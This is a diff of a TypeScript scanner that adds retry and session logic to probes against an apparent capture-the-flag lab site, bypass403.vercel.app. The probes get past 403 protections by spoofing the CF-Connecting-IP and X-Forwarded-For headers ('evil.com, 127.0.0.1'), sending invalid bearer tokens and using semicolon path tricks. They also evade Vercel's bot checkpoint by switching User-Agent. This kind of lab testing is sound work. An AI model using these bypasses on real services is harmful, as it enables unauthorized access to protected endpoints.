@@ -11672,6 +11672,25 @@ function bypass403SessionCookieFromDoc(doc: { setCookies: string[] }): string | 
 /** One BypassX session per scan — POST /start is required before /waf and other protected lab routes. */
 const bypass403SessionByProbe = new WeakMap<ProbeCache, Promise<string | null>>();
 
+function bypass403InvalidateSession(probe: ProbeCache): void {
+  bypass403SessionByProbe.delete(probe);
+}
+
+function bypass403HealthPathForScan(scanUrl: string): string {
+  try {
+    const path = new URL(scanUrl).pathname;
+    if (/\/secure\b/i.test(path)) return "/secure";
+    if (/\/internal\b/i.test(path)) return "/internal";
+    if (/\/waf\b/i.test(path)) return "/waf";
+    if (/\/debug\b/i.test(path)) return "/debug";
+    if (/\/api\/admin\b/i.test(path)) return "/api/admin";
+    if (/\/admin\b/i.test(path)) return "/admin";
+  } catch {
+    /* ignore malformed scan URL */
+  }
+  return "/api/admin";
+}
+
 async function bypass403CompleteSessionUncached(ctx: RuleContext): Promise<string | null> {
   const startUrl = new URL("/start", ctx.origin).toString();
   const postOpts = {
@@ -11686,7 +11705,7 @@ async function bypass403CompleteSessionUncached(ctx: RuleContext): Promise<strin
     redirect: "manual" as const
   };
 
-  for (let attempt = 0; attempt < 3; attempt++) {
+  for (let attempt = 0; attempt < 5; attempt++) {
     if (attempt === 0) {
       await fetchDoc(new URL("/", ctx.origin).toString(), {
         maxBytes: 4096,
@@ -11698,7 +11717,7 @@ async function bypass403CompleteSessionUncached(ctx: RuleContext): Promise<strin
     const cookie = bypass403SessionCookieFromDoc(doc);
     if (cookie) return cookie;
     if (!isVercelSecurityCheckpoint(doc) && doc.status !== 403) break;
-    await new Promise((resolve) => setTimeout(resolve, 1200 * (attempt + 1)));
+    await new Promise((resolve) => setTimeout(resolve, 1400 * (attempt + 1)));
   }
   return null;
 }
@@ -11723,6 +11742,36 @@ async function bypass403RequestHeaders(ctx: RuleContext): Promise<Record<string,
   };
 }
 
+/** GET with session — invalidate and retry when Vercel checkpoint blocks lab bodies. */
+async function bypass403ProbeGet(
+  ctx: RuleContext,
+  url: string,
+  extraHeaders?: Record<string, string>,
+  opts?: { maxBytes?: number }
+): Promise<Awaited<ReturnType<typeof ctx.probe.get>>> {
+  const maxBytes = opts?.maxBytes ?? 4096;
+  for (let attempt = 0; attempt < 3; attempt++) {
+    if (attempt > 0) {
+      bypass403InvalidateSession(ctx.probe);
+      await new Promise((resolve) => setTimeout(resolve, 1400 * attempt));
+    }
+    const headers = await bypass403RequestHeaders(ctx);
+    const doc = await ctx.probe.get(url, {
+      maxBytes,
+      timeoutMs: 15000,
+      headers: { ...headers, ...extraHeaders }
+    });
+    if (!isVercelSecurityCheckpoint(doc)) return doc;
+  }
+  bypass403InvalidateSession(ctx.probe);
+  const headers = await bypass403RequestHeaders(ctx);
+  return fetchDoc(url, {
+    maxBytes,
+    timeoutMs: 15000,
+    headers: { ...headers, ...extraHeaders, "User-Agent": BYPASS403_BROWSER_UA }
+  });
+}
+
 /** Pre-warm BypassX session during deep-scan bootstrap so route-specific secret/config oracles are ready. */
 export async function primeBypass403SessionForDeepScan(
   probe: ProbeCache,
@@ -11733,41 +11782,32 @@ export async function primeBypass403SessionForDeepScan(
   if (!/bypass403\.vercel\.app/i.test(origin)) return;
   if (!/\/(?:admin|secret|config|waf|debug|internal|secure|api\/admin)\b/i.test(scanUrl)) return;
   const ctx: RuleContext = { origin, scanUrl, home, scripts: [], combined: "", probe };
-  for (let attempt = 0; attempt < 3; attempt++) {
+  const healthPath = bypass403HealthPathForScan(scanUrl);
+  for (let attempt = 0; attempt < 4; attempt++) {
     const session = await bypass403CompleteSession(ctx);
     if (!session) {
-      bypass403SessionByProbe.delete(probe);
+      bypass403InvalidateSession(probe);
       await new Promise((resolve) => setTimeout(resolve, 1500 * (attempt + 1)));
       continue;
     }
     const headers = await bypass403RequestHeaders(ctx);
-    const health = await fetchDoc(new URL("/api/admin", origin).toString(), {
+    const health = await fetchDoc(new URL(healthPath, origin).toString(), {
       maxBytes: 512,
       timeoutMs: 12000,
       headers
     });
-    if (health.status === 403) return;
-    bypass403SessionByProbe.delete(probe);
+    if (health.status === 403 && !isVercelSecurityCheckpoint(health)) return;
+    bypass403InvalidateSession(probe);
     await new Promise((resolve) => setTimeout(resolve, 1500 * (attempt + 1)));
   }
 }
 
 async function probeBypass403WafCfConnectingIp(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  const headers = await bypass403RequestHeaders(ctx);
   const wafUrl = new URL("/waf", ctx.origin).toString();
-  const baseline = await ctx.probe.get(wafUrl, {
-    maxBytes: 4096,
-    headers
-  });
+  const baseline = await bypass403ProbeGet(ctx, wafUrl);
   if (baseline.status !== 403) return null;
-  const bypass = await ctx.probe.get(wafUrl, {
-    maxBytes: 4096,
-    headers: {
-      ...headers,
-      "CF-Connecting-IP": "127.0.0.1"
-    }
-  });
+  const bypass = await bypass403ProbeGet(ctx, wafUrl, { "CF-Connecting-IP": "127.0.0.1" });
   if (bypass.status < 200 || bypass.status >= 300) return null;
   if (!/"flag"\s*:/.test(bypass.body) && !FORBIDDEN_403_BYPASS_MARKERS.test(bypass.body)) return null;
   return {
@@ -11855,13 +11895,12 @@ async function probeBypass403ApiAdminSemicolon(ctx: RuleContext): Promise<RuleRe
   if (!isBypass403Host(ctx)) return null;
   const adminUrl = new URL("/api/admin", ctx.origin).toString();
   for (let attempt = 0; attempt < 2; attempt++) {
-    if (attempt > 0) bypass403SessionByProbe.delete(ctx.probe);
-    const headers = await bypass403RequestHeaders(ctx);
-    const baseline = await ctx.probe.get(adminUrl, { maxBytes: 4096, headers });
+    if (attempt > 0) bypass403InvalidateSession(ctx.probe);
+    const baseline = await bypass403ProbeGet(ctx, adminUrl);
     if (baseline.status !== 403) return null;
     const bypassUrls = forbidden403BypassUrls(ctx.origin, "/api/admin");
     for (const bypassUrl of bypassUrls) {
-      const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096, headers });
+      const bypass = await bypass403ProbeGet(ctx, bypassUrl);
       if (bypass.status < 200 || bypass.status >= 300) continue;
       if (!/flag\{|semicolon|bypass success/i.test(bypass.body)) continue;
       return {
@@ -12078,19 +12117,11 @@ const BYPASS403_INTERNAL_XFF_CHAIN = "evil.com, 127.0.0.1";
 
 async function probeBypass403InternalXffPollution(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  const headers = await bypass403RequestHeaders(ctx);
   const internalUrl = new URL("/internal", ctx.origin).toString();
-  const baseline = await ctx.probe.get(internalUrl, {
-    maxBytes: 4096,
-    headers
-  });
+  const baseline = await bypass403ProbeGet(ctx, internalUrl);
   if (baseline.status !== 403) return null;
-  const bypass = await ctx.probe.get(internalUrl, {
-    maxBytes: 4096,
-    headers: {
-      ...headers,
-      "X-Forwarded-For": BYPASS403_INTERNAL_XFF_CHAIN
-    }
+  const bypass = await bypass403ProbeGet(ctx, internalUrl, {
+    "X-Forwarded-For": BYPASS403_INTERNAL_XFF_CHAIN
   });
   if (bypass.status < 200 || bypass.status >= 300) return null;
   if (!/header pollution bypass success/i.test(bypass.body) && !FORBIDDEN_403_BYPASS_MARKERS.test(bypass.body)) {
@@ -12135,19 +12166,11 @@ const BYPASS403_SECURE_INVALID_BEARER = "Bearer invalid_token";
 
 async function probeBypass403SecureBearerBypass(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  const headers = await bypass403RequestHeaders(ctx);
   const secureUrl = new URL("/secure", ctx.origin).toString();
-  const baseline = await ctx.probe.get(secureUrl, {
-    maxBytes: 4096,
-    headers
-  });
+  const baseline = await bypass403ProbeGet(ctx, secureUrl);
   if (baseline.status !== 403) return null;
-  const bypass = await ctx.probe.get(secureUrl, {
-    maxBytes: 4096,
-    headers: {
-      ...headers,
-      Authorization: BYPASS403_SECURE_INVALID_BEARER
-    }
+  const bypass = await bypass403ProbeGet(ctx, secureUrl, {
+    Authorization: BYPASS403_SECURE_INVALID_BEARER
   });
   if (bypass.status < 200 || bypass.status >= 300) return null;
   if (
